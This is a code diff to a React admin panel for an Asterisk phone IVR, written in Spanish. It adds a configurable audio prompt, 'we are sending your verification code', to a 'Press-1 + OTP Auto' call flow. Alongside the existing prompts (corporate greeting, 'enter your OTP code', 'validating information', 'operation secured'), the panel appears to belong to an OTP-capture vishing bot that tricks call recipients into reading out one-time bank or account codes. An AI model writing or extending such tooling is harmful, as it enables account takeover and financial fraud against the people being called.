@@ -180,6 +180,17 @@ const SYSTEM_ROLES: RoleConfig[] = [
     fallbackDefault: 'custom/opcion_invalida',
   },
   {
+    role: 'otp_verify_wait',
+    title: 'Press-1 + OTP Auto: Enviando Código (Al Marcar 1)',
+    badge: 'Press-1 + OTP Auto',
+    badgeColor: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/30',
+    category: 'otp',
+    icon: Volume2,
+    description: 'Audio que escucha el cliente inmediatamente al marcar 1 en Press-1 + OTP Automático ("Un momento por favor, le estamos enviando su código de verificación...").',
+    astDbKey: 'ivr_vars default_otp_verify_wait',
+    fallbackDefault: 'custom/enviando_codigo_verificacion',
+  },
+  {
     role: 'otp_welcome',
     title: 'Solicitud de Código OTP / Token',
     badge: 'Captura de Código',
@@ -291,6 +302,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
       press1_welcome: 'custom/bienvenida_corporativa',
       agent_transfer: 'custom/conectar_asesor',
       press1_invalid: 'custom/opcion_invalida',
+      otp_verify_wait: 'custom/enviando_codigo_verificacion',
       otp_welcome: 'custom/solicitar_codigo_otp',
       otp_wait: 'custom/un_momento_validando_informacion',
       otp_success: 'custom/operacion_bloqueada_exito',
@@ -2336,6 +2348,25 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
 
                   <button
                     onClick={() => {
+                      if (activeAssignments.otp_verify_wait === audio.asteriskPath) {
+                        handleDeactivateRole('otp_verify_wait');
+                      } else {
+                        handleAssignRoleDirect('otp_verify_wait', audio.asteriskPath);
+                      }
+                    }}
+                    className={`text-[11px] px-2 py-1 rounded transition-colors flex items-center gap-1 font-medium ${
+                      activeAssignments.otp_verify_wait === audio.asteriskPath
+                        ? 'bg-cyan-500 text-black font-bold shadow-sm shadow-cyan-500/20 hover:bg-cyan-600'
+                        : 'bg-cyan-500/10 text-cyan-300 border border-cyan-500/20 hover:bg-cyan-500/20'
+                    }`}
+                    title={activeAssignments.otp_verify_wait === audio.asteriskPath ? "Activo actualmente. Haz clic para desactivar" : "Asignar como audio al marcar 1 en Press-1 + OTP Automático"}
+                  >
+                    <span>Al marcar 1 (OTP Auto)</span>
+                    {activeAssignments.otp_verify_wait === audio.asteriskPath && <span>✓ (Activo)</span>}
+                  </button>
+
+                  <button
+                    onClick={() => {
                       if (activeAssignments.otp_failure === audio.asteriskPath) {
                         handleDeactivateRole('otp_failure');
                       } else {
@@ -2462,6 +2493,7 @@ export const AudioLibraryTab: React.FC<AudioLibraryTabProps> = ({
                   <option value="press1_welcome">Bienvenida IVR Press 1 (Al contestar llamada)</option>
                   <option value="agent_transfer">Transferencia a Asesor ("Un momento por favor...")</option>
                   <option value="press1_invalid">Opción Inválida en Menú Press 1</option>
+                  <option value="otp_verify_wait">Press-1 + OTP Auto: Al Marcar 1 ("Le estamos enviando su código...")</option>
                   <option value="otp_welcome">Solicitud Dígitos OTP ("Ingrese su código...")</option>
                   <option value="otp_wait">Validación en Espera ("Validando información...")</option>
                   <option value="otp_success">Validación Correcta ("Operación asegurada")</option>
